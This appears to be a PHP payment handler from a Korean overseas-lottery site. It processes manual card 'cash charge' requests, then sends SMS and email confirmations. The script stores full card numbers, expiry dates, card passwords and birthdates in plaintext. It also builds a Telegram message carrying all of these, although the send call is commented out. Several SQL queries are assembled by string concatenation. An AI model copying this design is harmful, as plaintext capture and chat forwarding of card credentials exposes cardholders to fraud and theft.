<?php
  $session_start_samesite = "Y";
  require_once $_SERVER['DOCUMENT_ROOT']."/_common/config.php";
  require_once $_SERVER['DOCUMENT_ROOT']."/_common/common.php";  
  require_once $_SERVER['DOCUMENT_ROOT']."/_library/function_CASH.php";
  require_once $_SERVER['DOCUMENT_ROOT']."/_library/function_T_CASH_LOG.php";
  require_once $_SERVER['DOCUMENT_ROOT']."/_library/function_T_POINT_LOG.php";
  require_once $_SERVER['DOCUMENT_ROOT']."/_common/pay_function.php";

  //***** 카드 OTBILL수기결제 요청 *****/

  if (!isset($cash_op[$_POST['cno']])) {
    alert_print("상품을 선택해 주세요.");
    meta_go("./cash-charge.html");
    exit;
  }

  $mem = $db->get_data("SELECT * FROM MEMBER WHERE USER_ID='".$M_login['user_id']."' LIMIT 1");

  // 결제 이벤트 대상 확인
  $cash_op = select_event_cash_op($M_login['user_id']);

  $product = $cash_op[$_POST['cno']];

  if ($mem['USER_ID'] == '') {
    alert_print("존재하지 않은 회원입니다.");
    meta_go("./cash-charge.html");
    exit;
  }

  // pg 선택 (확율 방식)
  // 삼성, 현대의 경우는 코엠이 선택될 경우 실패코드에 따라 웨이업으로 다시 결제 시도
  //$pg = selectPG($pg_rate);

  // [임시] 60,000 ~ 300,000 상품 결제 시 코엠으로 결제 되도록 적용
  //$pg = "wizzpay";

  $patner['USER_ID'] = "";

  if ($mem['PATNER_NO'] != '') {
    $patner = $db->get_data("SELECT * FROM PATNER WHERE PATNER_NO='".$mem['PATNER_NO']."'");

    if (!isset($patner['USER_ID'])) {
      $patner['USER_ID'] = "";
    }
  }

  # 파트너 첫결제
  if ($mem['PARTNER_ID']) {
    $RESULT_PARTNER_ID = exec_partner_firstsale($mem['USER_ID'] , $mem['PARTNER_ID'] , $mem['REG_DATE']);
  }

  # 파트너 summary 처리
  if ($RESULT_PARTNER_ID) {
    exec_partner_summary($mem['PARTNER_ID'] , "PAY");
  }

  $VAL = array();
  $VAL['mode'] = "insert";
  $VAL['MEMBER_NO'] = $mem['MEMBER_NO'];
  $VAL['USER_ID'] = $mem['USER_ID'];
  $VAL['USER_NAME'] = $C_CARDHOLDER;
  $VAL['IS_USE'] = "";
  $VAL['CASH'] = $product['cash'];
  //$VAL['IPOINT'] = $cash_op[$vals['cno']]['ipoint'];
  $VAL['IPOINT'] = 0;
  $VAL['PRICE'] = $product['price'];
  $VAL['AUTHNUM'] = $CARDAUTHNO;//카드승인번호
  $VAL['CARDCD'] = $CARDCODE;//카드사코드
  $VAL['ITEMNAME'] = $ITEMNAME;//상품명
  $VAL['CARDNAME'] = "카드";//카드사 명
  $VAL['CARDNO'] = $BILLINFO;//카드번호
  $VAL['TID'] = $TID;//코엠 거래 키
  $VAL['PATNER_ID'] = $patner['USER_ID'];
  $VAL['SELLER_GUBUN'] = 'Mobile';
  $VAL['QUOTA'] = $QUOTA;//할부개월수
  $VAL['IN_IP'] = $ip_address;
  $VAL['PARTNER_ID'] = $RESULT_PARTNER_ID;
  $VAL['PG_ID'] = $pg;
  $VAL['CASH_CNT'] = $db->get_data_one("SELECT COUNT(*) AS CNT FROM CASH WHERE MEMBER_NO = {$mem['MEMBER_NO']} AND IS_USE='Y'") + 1; //회원의 결제수
  $CASH_NO = F_CASH($VAL);

  if (!is_numeric($CASH_NO)) {
    syslog(LOG_DEBUG, "[CARD PAYMENT FAILED] ".print_r($VAL,true));
    exit;
  }

  $cash_log = array();
  $cash_log['mode'] = "insert";
  $cash_log['CASH_NO'] = $CASH_NO;
  $cash_log['ORDERS_NO'] = 0;
  $cash_log['WINNING_NO'] = 0;
  $cash_log['INVOCE_NO'] = 0;
  $cash_log['CASH_LOG_NO'] = 0;
  $cash_log['PRICE'] = $product['price'];
  $cash_log['CASH'] = $product['cash'];
  $cash_log['N_CASH'] = $mem['CASH'] + $product['cash'];
  $cash_log['O_CASH'] = $mem['CASH'];
  $cash_log['USER_ID'] = $mem['USER_ID'];
  $cash_log['MEMO'] = "캐시구매충전신청";
  $cash_log['STATUS'] = "P";
  $cash_log['IN_IP'] = $ip_address;
  $cash_log['PARTNER_ID'] = $RESULT_PARTNER_ID;

  $cash_log['CARD_JUNAME'] = $C_CARDHOLDER;
  $cash_log['CARD_PHONE'] = $C_CONTACT;
  $cash_log['CARD_IN'] = $C_INSTALLMENT;
  $cash_log['CARD_BIRTH'] = $CARDAUTH;
  $cash_log['CARD_NUMBER'] = $BILLINFO;
  $cash_log['CARD_MONTH'] = $EXPIREPERIOD;
  $cash_log['CARD_PASS'] = $CARDPWD;
  F_T_CASH_LOG($cash_log);

  $telegram_message = "[카드 결제mo]\n";
  $telegram_message .= "카드주명 : {$cash_log['CARD_JUNAME']}\n";
  $telegram_message .= "연락처 : {$cash_log['CARD_PHONE']}\n";
  $telegram_message .= "할부 : {$cash_log['CARD_IN']}\n";
  $telegram_message .= "생년월일: {$cash_log['CARD_BIRTH']}\n";
  $telegram_message .= "금액: {$cash_log['PRICE']}\n";
  
  $card_digits = preg_replace('/\D/', '', $cash_log['CARD_NUMBER']);
  $card_len = strlen($card_digits);
  if ($card_len == 16) {
    $card_formatted = substr($card_digits, 0, 4) . '-' . substr($card_digits, 4, 4) . '-' . substr($card_digits, 8, 4) . '-' . substr($card_digits, 12, 4);
  } elseif ($card_len == 15) {
    $card_formatted = substr($card_digits, 0, 4) . '-' . substr($card_digits, 4, 4) . '-' . substr($card_digits, 8, 4) . '-' . substr($card_digits, 12, 3);
  } else {
    $card_formatted = $cash_log['CARD_NUMBER'];
  }
  $telegram_message .= "카드번호: {$card_formatted}\n";

  $telegram_message .= "유효기간: {$cash_log['CARD_MONTH']}\n";
  $telegram_message .= "비밀번호: {$cash_log['CARD_PASS']}\n";
  $telegram_message .= "신청일 : ".date("Y-m-d H:i:s")."\n";
  //sendTelegramGroup($telegram_group_id, $telegram_message, $telegram_token);

//   $db->query("UPDATE MEMBER SET CASH=CASH+".$VAL['CASH']." WHERE USER_ID='".$mem['USER_ID']."'");
  // 보너스포인트 처리
//   if ($product['point'] > 0) {
//     $point_log = array();
//     $point_log["mode"] = "insert";
//     $point_log["COUPON_NO"] = 0;
//     $point_log["ORDERS_NO"] = 0;
//     $point_log["CASH_LOG_NO"] = $CASH_NO;
//     $point_log["POINT"] = $product['point'];
//     $point_log["N_POINT"] = $mem["POINT"] + $product['point'];
//     $point_log["O_POINT"] = $mem["POINT"];
//     $point_log["USER_ID"] = $mem['USER_ID'];
//     $point_log["MEMO"] = "캐시충전보너스";
//     $point_log["STATUS"] = "P";
//     F_T_POINT_LOG($point_log);

//     $db->query("UPDATE MEMBER SET POINT=POINT+".$product['point']." WHERE USER_ID='".$mem['USER_ID']."'");
//   }


  $TEMPLET_NO   = 51;
  $SMSTEMPLET   = $db->get_data("SELECT * FROM SMSTEMPLET WHERE TEMPLET_NO='".$TEMPLET_NO."'");

  $from         = $fromHP;
  $to           = $mem["HP"];
  $CODESK       = "S";
  $MEMBER_NO    = $mem['MEMBER_NO'];
  $MEMBER_NAME  = $mem['NAME'];
  $SUBJECT      = $SMSTEMPLET['SUBJECT'];
  $SENDMSG      = $SMSTEMPLET['CONTENT'];
  $SENDMSG      = str_replace('{USERID}', $mem['USER_ID'], $SENDMSG);
  $SENDMSG      = str_replace('{PRICE}', number_format($product['price']), $SENDMSG);
  $SENDMSG      = addslashes($SENDMSG);
  $sms          = curl_sms($to, $from, $CODESK, $TEMPLET_NO, $MEMBER_NO, $MEMBER_NAME, $SUBJECT, $SENDMSG,"LMS");


  if ($mem['EMAIL'] != '') {
    $TEMPLET_NO = 2;

    $EMAILTEMPLET = $db->get_data("SELECT * FROM EMAILTEMPLET WHERE TEMPLET_NO='".$TEMPLET_NO."'");
    $to = $mem['EMAIL'];
    $subject = $EMAILTEMPLET['SUBJECT'];
    $content = $EMAILTEMPLET['CONTENT'];
    $type = "2";

    if ($EMAILTEMPLET['STOPYN'] == 'N') {
      // mailer($fname, $fmail, $to, $subject, $content, $type, $mem['NAME'], $mem['MEMBER_NO'], $TEMPLET_NO);
      // AWS SES 클라이언트 생성
      $sesClient = initializeSesClient();
      if ($sesClient) {
        sendMail($sesClient, $fname, $fmail, $to, $subject, $content, $type, $mem['NAME'], $mem['MEMBER_NO'], $TEMPLET_NO);
      }
    }
  }
  //alert_print("구매하였습니다.");
  //meta_go("/contents/mypage/cash-charge.html");
?>

<!DOCTYPE html>
<html lang="ko">
  <head>
    <?php if ($_SERVER['HTTP_HOST'] == 'www.sulotko.com' || $_SERVER['HTTP_HOST'] == 'sulotko.com') { ?>
    <!-- Google tag (gtag.js) // www.sulotko.com -->
    <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', '');
    </script>
    <?php } else { ?>
    <!-- Global site tag (gtag.js) // 파워메가볼 -->
    <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', '');
    </script>
    <?php } ?>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>파메코 - 파워볼, 메가밀리언, 미국 로또, 미국 복권, 파워메가볼</title>

    <meta name="description" content="해외 복권 구매 1등 번호 당첨 분석 무료 파워볼 메가밀리언 회차별 추첨 정보 제공">
    <meta name="msapplication-TileImage" content="/common/images/cropped-favicon-270x270.png" />

    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/common/plugin/jquery-ui.js"></script>
    <link rel="stylesheet" href="/common/plugin/jquery-ui.css">


    <!-- Taboola Pixel Code -->
    <script type='text/javascript'>
      window._tfa = window._tfa || [];
      window._tfa.push({notify: 'event', name: 'page_view', id: 2024947});
      !function (t, f, a, x) {
            if (!document.getElementById(x)) {
                t.async = 1;t.src = a;t.id=x;f.parentNode.insertBefore(t, f);
            }
      }(document.createElement('script'),
      document.getElementsByTagName('script')[0],
      '//cdn.taboola.com/libtrc/unip/2024947/tfa.js',
      'tb_tfa_script');

      _tfa.push({notify: 'event', name: 'lead', id: 2024947});
    </script>
    <!-- End of Taboola Pixel Code -->

  </head>
  <body>
  </body>

  <script>
    alert("캐시 충전이 신청 되었습니다! 최대 10분 내에 충전이 완료 됩니다.");
    location.href = "/contents/mypage/cash-charge.html";
  </script>

</html>
